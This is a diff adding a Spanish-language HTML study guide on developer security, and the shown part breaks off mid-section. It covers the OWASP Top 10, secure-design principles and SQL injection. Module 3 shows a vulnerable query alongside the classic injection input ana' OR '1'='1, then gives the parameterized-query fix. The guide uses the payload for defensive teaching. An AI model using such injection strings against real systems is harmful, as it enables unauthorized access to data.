@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Seguridad para Desarrolladores — Guía de Estudio</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+  body { font-family: 'Inter', system-ui, sans-serif; }
+  .chapter { display: none; }
+  .chapter.active { display: block; }
+  .nav-link.active-nav { background: rgba(220,38,38,0.12); color: #dc2626; font-weight: 600; }
+  .quiz-option { transition: all 0.2s; }
+  .quiz-option:hover { transform: translateX(4px); }
+  .quiz-option.correct { background: #d1fae5 !important; border-color: #10b981 !important; }
+  .quiz-option.incorrect { background: #fee2e2 !important; border-color: #ef4444 !important; }
+  html { scroll-behavior: smooth; }
+  .gterm { border-bottom: 2px dotted #dc2626; cursor: help; position: relative; color: #b91c1c; font-weight: 600; }
+  .gterm .gtooltip {
+    display: none; position: absolute; bottom: 125%; left: 50%; transform: translateX(-50%);
+    background: #450a0a; color: white; padding: 8px 12px; border-radius: 8px;
+    font-size: 11px; min-width: 200px; max-width: 280px; white-space: normal;
+    z-index: 999; line-height: 1.5; box-shadow: 0 4px 16px rgba(0,0,0,0.25); pointer-events: none;
+  }
+  .gterm:hover .gtooltip { display: block; }
+  .flashcard { perspective: 700px; cursor: pointer; }
+  .fc-inner { position: relative; width: 100%; height: 150px; transition: transform 0.55s; transform-style: preserve-3d; }
+  .flashcard.flipped .fc-inner { transform: rotateY(180deg); }
+  .fc-front, .fc-back {
+    position: absolute; width: 100%; height: 100%; backface-visibility: hidden;
+    border-radius: 12px; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; padding: 14px; text-align: center;
+  }
+  .fc-back { transform: rotateY(180deg); }
+  .acc-body { max-height: 0; overflow: hidden; transition: max-height 0.35s ease; }
+  .acc-item.open .acc-body { max-height: 900px; }
+  .acc-arrow { transition: transform 0.3s; }
+  .acc-item.open .acc-arrow { transform: rotate(180deg); }
+  .ct-btn { font-size: 11px; font-weight: 700; padding: 6px 14px; border-radius: 8px 8px 0 0; background: #1e293b; color: #94a3b8; border: none; cursor: pointer; }
+  .ct-btn.ct-active { background: #0f172a; color: #f87171; }
+  .code-block { background: #0f172a; color: #e2e8f0; border-radius: 0 10px 10px 10px; padding: 14px 16px; font-size: 12.5px; overflow-x: auto; line-height: 1.7; font-family: Consolas, 'Courier New', monospace; margin: 0; }
+  .code-single { border-radius: 10px; }
+  .tok-k { color: #c084fc; } .tok-s { color: #86efac; } .tok-c { color: #64748b; font-style: italic; } .tok-f { color: #7dd3fc; } .tok-n { color: #fbbf24; } .tok-t { color: #f0abfc; }
+</style>
+</head>
+<body class="bg-gray-50 text-gray-800">
+
+<!-- CROSS-NAV BAR -->
+<div style="position:fixed;top:0;left:0;right:0;z-index:60;background:#1e293b;color:white;font-size:11px;height:32px;display:flex;align-items:center;justify-content:center;gap:12px;padding:0 12px;overflow-x:auto;white-space:nowrap;">
+  <a href="index.html" style="color:#fbbf24;font-weight:600;text-decoration:none;">Inicio</a>
+  <a href="CP1-Fundamentos-de-programacion.html" title="Fundamentos de Programación" style="color:#2dd4bf;text-decoration:none;">CP1</a>
+  <a href="CP2-Programacion-orientada-a-objetos.html" title="POO" style="color:#c4b5fd;text-decoration:none;">CP2</a>
+  <a href="CP3-APIs-y-comunicacion.html" title="APIs" style="color:#6ee7b7;text-decoration:none;">CP3</a>
+  <a href="CP4-Lo-que-todo-programador-debe-saber.html" title="Esenciales" style="color:#fcd34d;text-decoration:none;">CP4</a>
+  <a href="CP5-Backend-avanzado.html" title="Backend Avanzado" style="color:#f0abfc;text-decoration:none;">CP5</a>
+  <a href="CP6-Bases-de-datos-avanzado.html" title="Bases de Datos Avanzado" style="color:#7dd3fc;text-decoration:none;">CP6</a>
+  <a href="CP7-DevOps-e-infraestructura.html" title="DevOps" style="color:#fdba74;text-decoration:none;">CP7</a>
+  <span style="color:#f87171;font-weight:700;border-bottom:2px solid #f87171;">CP8</span>
+  <a href="CP9-Diseno-de-sistemas-y-liderazgo.html" title="Diseño de Sistemas y Liderazgo" style="color:#bef264;text-decoration:none;">CP9</a>
+  <a href="CP10-Servicios-de-red-e-infraestructura.html" title="Servicios de Red e Infraestructura TI" style="color:#a5b4fc;text-decoration:none;">CP10</a>
+</div>
+
+<!-- NAVBAR -->
+<nav style="top:32px;" class="fixed left-0 right-0 bg-white/95 backdrop-blur shadow-sm z-50 border-b border-gray-200">
+  <div class="max-w-7xl mx-auto px-4">
+    <div class="flex items-center justify-between h-14">
+      <div class="flex items-center gap-2">
+        <span class="text-red-700 font-bold text-lg">CP8</span>
+        <span class="hidden sm:inline text-sm font-semibold text-slate-800">Seguridad para Desarrolladores</span>
+      </div>
+      <div class="hidden md:flex items-center gap-2 flex-1 max-w-xs mx-6">
+        <div class="w-full bg-gray-200 rounded-full h-2">
+          <div id="globalProgress" class="bg-red-600 h-2 rounded-full transition-all duration-500" style="width:0%"></div>
+        </div>
+        <span id="globalProgressText" class="text-xs text-gray-500 whitespace-nowrap">0%</span>
+      </div>
+      <button onclick="document.getElementById('mobileMenu').classList.toggle('hidden')" class="md:hidden p-2 rounded-lg hover:bg-gray-100">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
+      </button>
+      <div class="hidden md:flex items-center gap-1 text-sm flex-wrap">
+        <button onclick="showChapter(0)" class="nav-link active-nav px-2 py-1.5 rounded-lg hover:bg-gray-100 transition" data-ch="0">Inicio</button>
+        <button onclick="showChapter(1)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition" data-ch="1">Mentalidad</button>
+        <button onclick="showChapter(2)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition" data-ch="2">OWASP</button>
+        <button onclick="showChapter(3)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition" data-ch="3">Inyección</button>
+        <button onclick="showChapter(4)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition" data-ch="4">XSS/CSRF</button>
+        <button onclick="showChapter(5)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition" data-ch="5">HTTPS</button>
+        <button onclick="showChapter(6)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition" data-ch="6">Secretos</button>
+        <button onclick="showChapter(7)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition" data-ch="7">Glosario</button>
+        <button onclick="showChapter(8)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition text-indigo-600 font-semibold" data-ch="8">Vocab EN</button>
+        <button onclick="showChapter(9)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition text-orange-600 font-semibold" data-ch="9">Entrevistas</button>
+        <button onclick="showChapter(10)" class="nav-link px-2 py-1.5 rounded-lg hover:bg-gray-100 transition text-rose-600 font-semibold" data-ch="10">Registro</button>
+      </div>
+    </div>
+  </div>
+  <div id="mobileMenu" class="hidden md:hidden bg-white border-t px-4 py-2 space-y-1 text-sm">
+    <button onclick="showChapter(0);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100">Inicio</button>
+    <button onclick="showChapter(1);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100">Módulo 1: La Mentalidad de Seguridad</button>
+    <button onclick="showChapter(2);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100">Módulo 2: OWASP Top 10</button>
+    <button onclick="showChapter(3);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100">Módulo 3: Inyección SQL y Validación</button>
+    <button onclick="showChapter(4);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100">Módulo 4: XSS y CSRF</button>
+    <button onclick="showChapter(5);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100">Módulo 5: HTTPS y TLS</button>
+    <button onclick="showChapter(6);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100">Módulo 6: Secretos y Contraseñas</button>
+    <button onclick="showChapter(7);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100">Glosario</button>
+    <button onclick="showChapter(8);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100 text-indigo-600">Vocabulario en Inglés</button>
+    <button onclick="showChapter(9);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100 text-orange-600">Consejos para Entrevistas</button>
+    <button onclick="showChapter(10);closeMob()" class="block w-full text-left px-3 py-2 rounded hover:bg-gray-100 text-rose-600">Registro de Estudios</button>
+  </div>
+</nav>
+
+<main class="pt-24">
+
+<!-- ===== INICIO ===== -->
+<div class="chapter active" id="ch0">
+  <section class="bg-gradient-to-br from-slate-800 via-red-900 to-rose-800 text-white py-20 px-4">
+    <div class="max-w-5xl mx-auto text-center">
+      <p class="uppercase tracking-widest text-red-300/70 text-sm mb-4">Guía de Estudio Completa · Nivel Avanzado · Curso 8 de 9</p>
+      <h1 class="text-4xl md:text-6xl font-black mb-4">Seguridad para<br>Desarrolladores</h1>
+      <p class="text-lg text-gray-300 max-w-2xl mx-auto mb-8">OWASP Top 10, inyección SQL, XSS, CSRF, HTTPS/TLS y manejo de secretos. Cómo escribir código que se DEFIENDE — porque la seguridad no es un departamento, es un hábito de todo programador.</p>
+      <div class="flex flex-wrap justify-center gap-4">
+        <button onclick="showChapter(1)" class="bg-white text-slate-800 font-semibold px-6 py-3 rounded-xl hover:bg-gray-100 transition">Comenzar a estudiar</button>
+        <button onclick="showChapter(9)" class="border-2 border-white/50 text-white font-semibold px-6 py-3 rounded-xl hover:bg-white/10 transition">Preparar entrevista</button>
+      </div>
+    </div>
+  </section>
+  <section class="max-w-5xl mx-auto -mt-10 px-4 mb-12">
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+      <div class="bg-white rounded-xl shadow-lg p-6 text-center"><div class="text-3xl font-black text-red-700">Top 10</div><div class="text-sm text-gray-500 mt-1">Los riesgos OWASP que debes conocer</div></div>
+      <div class="bg-white rounded-xl shadow-lg p-6 text-center"><div class="text-3xl font-black text-orange-500">#1</div><div class="text-sm text-gray-500 mt-1">Regla: nunca confíes en el cliente</div></div>
+      <div class="bg-white rounded-xl shadow-lg p-6 text-center"><div class="text-3xl font-black text-slate-800">🔒</div><div class="text-sm text-gray-500 mt-1">HTTPS siempre, sin excepciones</div></div>
+      <div class="bg-white rounded-xl shadow-lg p-6 text-center"><div class="text-3xl font-black text-sky-600">6</div><div class="text-sm text-gray-500 mt-1">Módulos con examen</div></div>
+    </div>
+  </section>
+  <section class="max-w-5xl mx-auto px-4 pb-16">
+    <h2 class="text-2xl font-bold text-slate-800 mb-6 text-center">Contenido del Curso</h2>
+    <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
+      <div onclick="showChapter(1)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-red-500"><span class="text-xs font-bold text-red-600 uppercase">Módulo 1</span><h3 class="font-bold mt-1">La Mentalidad de Seguridad</h3><p class="text-sm text-gray-500 mt-1">Nunca confíes en el cliente, defensa en profundidad, menor privilegio.</p></div>
+      <div onclick="showChapter(2)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-blue-500"><span class="text-xs font-bold text-blue-600 uppercase">Módulo 2</span><h3 class="font-bold mt-1">OWASP Top 10</h3><p class="text-sm text-gray-500 mt-1">El mapa de los riesgos más comunes en aplicaciones web.</p></div>
+      <div onclick="showChapter(3)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-purple-500"><span class="text-xs font-bold text-purple-600 uppercase">Módulo 3</span><h3 class="font-bold mt-1">Inyección SQL y Validación</h3><p class="text-sm text-gray-500 mt-1">El ataque clásico y las consultas parametrizadas que lo anulan.</p></div>
+      <div onclick="showChapter(4)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-cyan-500"><span class="text-xs font-bold text-cyan-600 uppercase">Módulo 4</span><h3 class="font-bold mt-1">XSS y CSRF</h3><p class="text-sm text-gray-500 mt-1">Los dos ataques del lado del navegador y cómo neutralizarlos.</p></div>
+      <div onclick="showChapter(5)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-green-500"><span class="text-xs font-bold text-green-600 uppercase">Módulo 5</span><h3 class="font-bold mt-1">HTTPS, SSL/TLS y Certificados</h3><p class="text-sm text-gray-500 mt-1">Qué protege el candadito y cómo funciona.</p></div>
+      <div onclick="showChapter(6)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-rose-500"><span class="text-xs font-bold text-rose-600 uppercase">Módulo 6</span><h3 class="font-bold mt-1">Secretos y Contraseñas</h3><p class="text-sm text-gray-500 mt-1">Variables de entorno, gestores de secretos y hashing.</p></div>
+      <div onclick="showChapter(7)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-gray-400"><span class="text-xs font-bold text-gray-500 uppercase">Extra</span><h3 class="font-bold mt-1">Glosario ES / EN</h3><p class="text-sm text-gray-500 mt-1">El vocabulario de seguridad completo.</p></div>
+      <div onclick="showChapter(8)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-indigo-400"><span class="text-xs font-bold text-indigo-500 uppercase">Práctica</span><h3 class="font-bold mt-1">Vocabulario en Inglés</h3><p class="text-sm text-gray-500 mt-1">Tarjetas interactivas para practicar.</p></div>
+      <div onclick="showChapter(9)" class="cursor-pointer bg-white rounded-xl shadow hover:shadow-lg transition p-5 border-l-4 border-orange-400"><span class="text-xs font-bold text-orange-500 uppercase">Carrera</span><h3 class="font-bold mt-1">Consejos para Entrevistas</h3><p class="text-sm text-gray-500 mt-1">En inglés y español, con traducción completa.</p></div>
+    </div>
+    <div class="mt-8 bg-red-50 border border-red-200 rounded-xl p-5 text-sm text-red-900">
+      🛡️ <strong>Enfoque de esta guía:</strong> seguridad DEFENSIVA para desarrolladores — entender cómo funcionan los ataques comunes para escribir código que los resista. Es exactamente lo que las entrevistas y los equipos esperan de un senior.
+    </div>
+  </section>
+</div>
+
+<!-- ===== CAP 1: MENTALIDAD ===== -->
+<div class="chapter" id="ch1">
+  <section class="bg-gradient-to-r from-red-700 to-red-900 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-red-300 text-sm mb-2">Módulo 1</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">La Mentalidad de Seguridad</h1>
+    <p class="text-lg text-red-200 max-w-3xl">Antes de las técnicas, los principios que lo sostienen todo.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-10 border-l-4 border-red-500">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">🚪 Regla #1: NUNCA confíes en el cliente</h2>
+      <p class="text-sm text-gray-600 mb-4">Todo lo que llega de fuera — formularios, parámetros de URL, headers, JSON del body, cookies — <strong>puede haber sido manipulado</strong>. El navegador valida por cortesía (mejor UX), pero cualquiera puede saltarse esa validación enviando la petición directa con curl o Postman (¡lo aprendiste en CP3!).</p>
+      <div class="grid md:grid-cols-2 gap-4">
+        <div class="bg-red-50 rounded-xl p-4 border border-red-200"><p class="text-sm font-semibold text-red-800 mb-1">❌ Pensamiento inocente</p><p class="text-sm text-gray-600">"El formulario tiene un select con 3 opciones; solo pueden llegar esas 3." — Falso: pueden llegar 900 caracteres de lo que sea.</p></div>
+        <div class="bg-green-50 rounded-xl p-4 border border-green-200"><p class="text-sm font-semibold text-green-800 mb-1">✅ Pensamiento defensivo</p><p class="text-sm text-gray-600">"El servidor valida TODO otra vez: tipo, rango, formato y permisos — sin importar lo que el frontend prometa." La validación del cliente es cortesía; la del servidor es seguridad.</p></div>
+      </div>
+    </div>
+
+    <h2 class="text-xl font-bold text-slate-800 mb-5 flex items-center gap-2"><span class="w-1.5 h-7 bg-red-600 rounded-full"></span>Los 4 principios que citarás toda tu carrera</h2>
+    <div class="grid md:grid-cols-2 gap-4 mb-10">
+      <div class="bg-white rounded-xl shadow p-5 border-t-4 border-red-400">
+        <h3 class="font-bold text-red-700 text-sm uppercase mb-2">🧅 Defensa en profundidad</h3>
+        <p class="text-sm text-gray-600">Varias capas de protección, como un castillo: foso + muralla + guardias. Si la validación falla, el ORM parametriza; si eso falla, el usuario de BD no tiene permisos de borrar; si eso falla, hay respaldos. <strong>Ninguna capa única es suficiente.</strong></p>
+      </div>
+      <div class="bg-white rounded-xl shadow p-5 border-t-4 border-orange-400">
+        <h3 class="font-bold text-orange-700 text-sm uppercase mb-2">🤏 Menor privilegio</h3>
+        <p class="text-sm text-gray-600">Cada usuario, app y servicio recibe SOLO los permisos que necesita para su tarea, ni uno más. La API que solo lee productos no necesita permisos de DELETE; el becario no necesita acceso a producción. Si algo se compromete, el daño queda acotado.</p>
+      </div>
+      <div class="bg-white rounded-xl shadow p-5 border-t-4 border-amber-400">
+        <h3 class="font-bold text-amber-700 text-sm uppercase mb-2">📉 Reducir la superficie de ataque</h3>
+        <p class="text-sm text-gray-600">Cada puerto abierto, endpoint expuesto, dependencia instalada y feature olvidada es una puerta potencial. Menos puertas = menos que defender. Borra el código muerto, cierra los puertos que no usas, elimina dependencias abandonadas.</p>
+      </div>
+      <div class="bg-white rounded-xl shadow p-5 border-t-4 border-rose-400">
+        <h3 class="font-bold text-rose-700 text-sm uppercase mb-2">🔍 Fallar de forma segura</h3>
+        <p class="text-sm text-gray-600">Cuando algo falla, el sistema debe quedar CERRADO, no abierto. Si el servicio de permisos no responde → denegar acceso (no conceder). Y los mensajes de error al usuario no deben revelar detalles internos (stack traces, versiones, rutas) — eso es información para el atacante.</p>
+      </div>
+    </div>
+
+    <div class="bg-red-50 border border-red-200 rounded-xl p-5 mb-10 text-sm text-red-900">
+      💼 <strong>Por qué esto es tema de SENIOR:</strong> un junior pregunta "¿funciona?"; un senior también pregunta "¿y si alguien lo usa MAL a propósito?". Esa segunda pregunta, hecha en cada code review, previene más incidentes que cualquier herramienta.
+    </div>
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 border-t-4 border-red-600" id="quiz1">
+      <h3 class="text-xl font-bold text-slate-800 mb-1">Examen — Módulo 1</h3>
+      <p class="text-sm text-gray-500 mb-6">La Mentalidad de Seguridad.</p>
+      <div id="quiz1Questions"></div>
+      <button onclick="gradeQuiz(1)" class="mt-6 bg-red-600 text-white font-semibold px-8 py-3 rounded-xl hover:bg-red-700 transition">Calificar</button>
+      <div id="quiz1Result" class="mt-4 hidden"></div>
+    </div>
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(0)" class="text-sm text-gray-500 hover:text-slate-800">← Inicio</button>
+      <button onclick="showChapter(2)" class="bg-slate-800 text-white px-6 py-2 rounded-xl hover:bg-red-800 transition text-sm font-semibold">Siguiente: OWASP →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 2: OWASP ===== -->
+<div class="chapter" id="ch2">
+  <section class="bg-gradient-to-r from-blue-700 to-blue-900 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-blue-300 text-sm mb-2">Módulo 2</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">OWASP Top 10</h1>
+    <p class="text-lg text-blue-200">El mapa oficial de los riesgos más comunes en aplicaciones web.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-10 border-l-4 border-blue-500">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">🗺️ ¿Qué es OWASP?</h2>
+      <p class="text-sm text-gray-600 mb-4">La <span class="gterm">OWASP<span class="gtooltip">🇺🇸 OWASP — Open Worldwide Application Security Project — Fundación sin fines de lucro que publica estándares y guías de seguridad de aplicaciones. Su "Top 10" es la referencia mundial de riesgos web.</span></span> (Open Worldwide Application Security Project) es la fundación de referencia en seguridad de aplicaciones. Su <strong>Top 10</strong> es la lista de las categorías de riesgo más frecuentes y graves — el vocabulario común entre desarrolladores, auditores y entrevistas. Aquí el panorama completo (los módulos 3 y 4 profundizan en los que más te tocan como dev):</p>
+      <div class="overflow-x-auto">
+      <table class="w-full text-sm bg-white rounded-xl overflow-hidden">
+        <thead class="bg-slate-800 text-white"><tr><th class="p-3 text-left">#</th><th class="p-3 text-left">Riesgo</th><th class="p-3 text-left">En una frase</th></tr></thead>
+        <tbody class="divide-y divide-gray-100">
+          <tr><td class="p-3 font-bold text-red-600">A01</td><td class="p-3 font-semibold">Broken Access Control</td><td class="p-3 text-gray-600">El usuario puede hacer/ver cosas que NO le corresponden (cambiar el id en la URL y ver datos ajenos). El #1 actual.</td></tr>
+          <tr class="bg-gray-50"><td class="p-3 font-bold text-red-600">A02</td><td class="p-3 font-semibold">Cryptographic Failures</td><td class="p-3 text-gray-600">Datos sensibles sin cifrar o mal cifrados: HTTP en vez de HTTPS, contraseñas en texto plano.</td></tr>
+          <tr><td class="p-3 font-bold text-red-600">A03</td><td class="p-3 font-semibold">Injection (SQL, etc.)</td><td class="p-3 text-gray-600">Entradas del usuario ejecutadas como código/consulta. El clásico eterno (→ módulo 3).</td></tr>
+          <tr class="bg-gray-50"><td class="p-3 font-bold text-orange-500">A04</td><td class="p-3 font-semibold">Insecure Design</td><td class="p-3 text-gray-600">La lógica misma es insegura desde el diseño: "recuperar contraseña" que revela si el correo existe.</td></tr>
+          <tr><td class="p-3 font-bold text-orange-500">A05</td><td class="p-3 font-semibold">Security Misconfiguration</td><td class="p-3 text-gray-600">Configuración floja: paneles de admin abiertos, mensajes de error con stack trace, permisos por defecto.</td></tr>
+          <tr class="bg-gray-50"><td class="p-3 font-bold text-orange-500">A06</td><td class="p-3 font-semibold">Vulnerable Components</td><td class="p-3 text-gray-600">Dependencias con vulnerabilidades conocidas sin actualizar. Tu app es tan segura como su librería más vieja.</td></tr>
+          <tr><td class="p-3 font-bold text-amber-500">A07</td><td class="p-3 font-semibold">Auth Failures</td><td class="p-3 text-gray-600">Autenticación débil: sin límite de intentos de login, sesiones eternas, contraseñas débiles permitidas.</td></tr>
+          <tr class="bg-gray-50"><td class="p-3 font-bold text-amber-500">A08</td><td class="p-3 font-semibold">Data Integrity Failures</td><td class="p-3 text-gray-600">Confiar en datos/actualizaciones sin verificar su integridad (ej. pipelines CI/CD comprometidos).</td></tr>
+          <tr><td class="p-3 font-bold text-amber-500">A09</td><td class="p-3 font-semibold">Logging Failures</td><td class="p-3 text-gray-600">Sin logs ni monitoreo: el ataque pasó hace 6 meses y nadie se enteró (→ CP7 módulo 6).</td></tr>
+          <tr class="bg-gray-50"><td class="p-3 font-bold text-amber-500">A10</td><td class="p-3 font-semibold">SSRF</td><td class="p-3 text-gray-600">Hacer que TU servidor haga peticiones a donde el atacante quiera (URLs internas de tu red).</td></tr>
+        </tbody>
+      </table>
+      </div>
+    </div>
+
+    <div class="bg-blue-50 border border-blue-200 rounded-xl p-5 mb-10 text-sm text-blue-900">
+      🎯 <strong>El patrón A01 que TODO dev debe evitar (IDOR):</strong> tu endpoint es <code class="bg-blue-100 px-1 rounded">GET /pedidos/1001</code>. Un usuario cambia el número a 1002... ¿y ve el pedido de OTRA persona? Eso es una Referencia Directa Insegura. La cura: en CADA endpoint, verificar que el recurso pedido <strong>pertenece al usuario autenticado</strong> — no basta con que esté logueado. Autenticación ≠ autorización (¿recuerdas CP3?).
+    </div>
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 border-t-4 border-blue-600" id="quiz2">
+      <h3 class="text-xl font-bold text-slate-800 mb-1">Examen — Módulo 2</h3>
+      <p class="text-sm text-gray-500 mb-6">OWASP Top 10.</p>
+      <div id="quiz2Questions"></div>
+      <button onclick="gradeQuiz(2)" class="mt-6 bg-blue-600 text-white font-semibold px-8 py-3 rounded-xl hover:bg-blue-700 transition">Calificar</button>
+      <div id="quiz2Result" class="mt-4 hidden"></div>
+    </div>
+    <div class="flex justify-between items-center mt-8 mb-4">
+      <button onclick="showChapter(1)" class="text-sm text-gray-500 hover:text-slate-800">← Mentalidad</button>
+      <button onclick="showChapter(3)" class="bg-slate-800 text-white px-6 py-2 rounded-xl hover:bg-red-800 transition text-sm font-semibold">Siguiente: Inyección →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CAP 3: INYECCIÓN SQL ===== -->
+<div class="chapter" id="ch3">
+  <section class="bg-gradient-to-r from-purple-700 to-purple-900 text-white py-16 px-4">
+    <div class="max-w-5xl mx-auto"><p class="uppercase tracking-widest text-purple-300 text-sm mb-2">Módulo 3</p>
+    <h1 class="text-3xl md:text-5xl font-black mb-3">Inyección SQL y Validación</h1>
+    <p class="text-lg text-purple-200">El ataque más famoso de la historia — y su cura definitiva.</p></div>
+  </section>
+  <div class="max-w-5xl mx-auto px-4 py-10">
+
+    <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 mb-10 border-l-4 border-purple-500">
+      <h2 class="text-xl font-bold text-slate-800 mb-4">💉 Cómo funciona (para saber defenderte)</h2>
+      <p class="text-sm text-gray-600 mb-4">La <span class="gterm">inyección SQL<span class="gtooltip">🇺🇸 SQL Injection — Ataque donde el texto que el usuario escribe se CONCATENA dentro de una consulta SQL y se ejecuta como parte de ella, alterando su lógica. Se previene con consultas parametrizadas.</span></span> ocurre cuando construyes consultas <strong>pegando texto del usuario</strong> directamente en el SQL. El texto deja de ser "dato" y se convierte en "código":</p>
+      <pre class="code-block code-single mb-4"><code><span class="tok-c"># ❌ VULNERABLE: la consulta se arma pegando texto del usuario</span>
+usuario = <span class="tok-f">input</span>(<span class="tok-s">"Usuario: "</span>)
+consulta = <span class="tok-s">f"SELECT * FROM Usuarios WHERE nombre = '{usuario}'"</span>
+
+<span class="tok-c"># Si el usuario escribe:  ana' OR '1'='1</span>
+<span class="tok-c"># La consulta se convierte en:</span>
+<span class="tok-c">#   SELECT * FROM Usuarios WHERE nombre = 'ana' OR '1'='1'</span>
+<span class="tok-c"># '1'='1' SIEMPRE es verdadero → devuelve TODOS los usuarios 😱</span>
+<span class="tok-c"># Variantes peores pueden modificar o borrar tablas completas.</span></code></pre>
+      <p class="text-sm text-gray-600 mb-3">La cura es simple y total: <strong>consultas parametrizadas</strong>. El valor del usuario viaja SEPARADO del SQL, como dato puro — la base de datos jamás lo interpreta como código:</p>
+      <div class="code-wrap">
+        <div class="flex"><button class="ct-btn ct-active" data-lang="py" onclick="setLang('py')">🐍 Python</button><button class="ct-btn" data-lang="cs" onclick="setLang('cs')">#️⃣ C#</button></div>
+        <pre class="code-block code-py"><code><span class="tok-c"># ✅ SEGURO: consulta parametrizada — el valor viaja aparte</span>
+cursor.<span class="tok-f">execute</span>(
+    <span class="tok-s">"SELECT * FROM Usuarios WHERE nombre = %s"</span>,   <span class="tok-c"># el SQL fijo</span>
+    (usuario,)                                     <span class="tok-c"># el dato, separado</span>
+)
+<span class="tok-c"># Aunque escriban ana' OR '1'='1, se busca literalmente</span>
+<span class="tok-c"># un usuario LLAMADO "ana' OR '1'='1". Inofensivo. ✅</span>
+
+<span class="tok-c"># Los ORMs (CP6) parametrizan por ti automáticamente:</span>
+session.<span class="tok-f">query</span>(<span class="tok-t">Usuario</span>).<span class="tok-f">filter</span>(<span class="tok-t">Usuario</span>.nombre == usuario)</code></pre>
+        <pre class="code-block code-cs hidden"><code><span class="tok-c">// ✅ SEGURO: consulta parametrizada — el valor viaja aparte</span>
+<span class="tok-k">var</span> cmd = <span class="tok-k">new</span> <span class="tok-t">SqlCommand</span>(
+    <span class="tok-s">"SELECT * FROM Usuarios WHERE nombre = @nombre"</span>, conexion);
+cmd.Parameters.<span class="tok-f">AddWithValue</span>(<span class="tok-s">"@nombre"</span>, usuario);   <span class="tok-c">// el dato, separado</span>
+
+<span class="tok-c">// Aunque escriban ana' OR '1'='1, se busca literalmente</span>
+<span class="tok-c">// un usuario LLAMADO así. Inofensivo. ✅</span>
+
+<span class="tok-c">// Entity Framework (CP6) parametriza por ti automáticamente:</span>
+db.Usuarios.<span class="tok-f">Where</span>(u =&gt; u.Nombre == usuario)</code></pre>
+      </div>
+    </div>
+
+    <h2 class="text-xl font-bold text-slate-800 mb-5 flex items-center gap-2"><span class="w-1.5 h-7 bg-purple-600 rounded-full"></span>Validación y sanitización: las otras dos murallas</h2>
+    <div class="grid md:grid-cols-2 gap-6 mb-10">
+      <div class="bg-white rounded-xl shadow p-6">
+        <h3 class="font-bold text-purple-700 mb-2">✅ Validar = rechazar lo que no cumple</h3>
+        <p class="text-sm text-gray-600 mb-2">Antes de procesar, verifica tipo, formato, rango y longitud. Prefiere <strong>listas blancas</strong> (qué SÍ se acepta) sobre listas negras (qué se prohíbe — siempre se te escapa algo):</p>
+        <ul class="text-sm text-gray-600 space-y-1">
+          <li>• Edad: entero entre 0 y 120</li>
+          <li>• Email: formato válido y máx. 254 caracteres</li>
+          <li>• Estado del pedido: SOLO uno de ["pendiente","enviado","entregado"]</li>
+        </ul>
+      </div>
+      <div class="bg-white rounded-xl shadow p-6">
+        <h3 class="font-bold text-indigo-700 mb-2">🧼 Sanitizar = limpiar/neutralizar lo peligroso</h3>
+        <p class="text-sm text-gray-600 mb-2">Cuando el dato debe aceptarse pero puede contener contenido activo, se <strong>neutraliza según el destino</strong>:</p>
